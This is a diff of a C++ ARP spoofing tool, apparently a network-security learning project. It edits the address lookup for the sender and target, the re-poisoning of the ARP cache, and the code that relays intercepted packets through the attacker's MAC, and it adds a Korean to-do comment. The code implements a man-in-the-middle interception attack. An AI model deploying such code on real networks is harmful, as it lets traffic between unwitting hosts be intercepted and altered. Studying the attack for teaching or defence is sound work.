@@ -80,13 +80,13 @@ int main(int argc, char *argv[]) {
         //get sender mac addr
         if (!send_arp_request(pcap, attacker_mac, attacker_ip,
             sender_ip, sender_mac)) {
-            cout << "Failed to get mac addr\n";
+            cout << "Failed to get mac addr" << string(sender_ip) << '\n';
             return false;
             }
         //get target mac addr
         if (!send_arp_request(pcap, attacker_mac, attacker_ip,
             target_ip, target_mac)) {
-            cout << "Failed to get mac addr\n";
+            cout << "Failed to get mac addr" << string(sender_ip) << '\n';
             return false;
             }
 	
@@ -294,9 +294,9 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             ArpHdr* arp_pkt = (ArpHdr*)(recv_pkt + sizeof(EthHdr));
             //sender -> taregt or target -> sender ARP request (broadcast)
             //cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl
-            if ((ethhdr->smac() == sender_mac || ethhdr->smac() == target_mac) && ethhdr->dmac() == Mac::broadcastMac() && (arp_pkt->op() == ArpHdr::Request))
+            if ((ethhdr->smac() == target_mac) && ethhdr->dmac() == Mac::broadcastMac() && (arp_pkt->op() == ArpHdr::Request))
             {
-                std::this_thread::sleep_for(std::chrono::milliseconds(200));
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
                         return false;
@@ -319,7 +319,7 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             memcpy(buf.get(), recv_pkt, len);
 
             EthHdr* eth = reinterpret_cast<EthHdr*>(buf.get());
-            if ((eth->smac() == sender_mac && eth->dmac() == attack_mac)) //sender send
+            if ((eth->smac() == sender_mac && eth->dmac() == attack_mac)) //sender send, ip 조건 추가해야함
             {
                 eth->smac_ = attack_mac;
                 eth->dmac_ = target_mac;
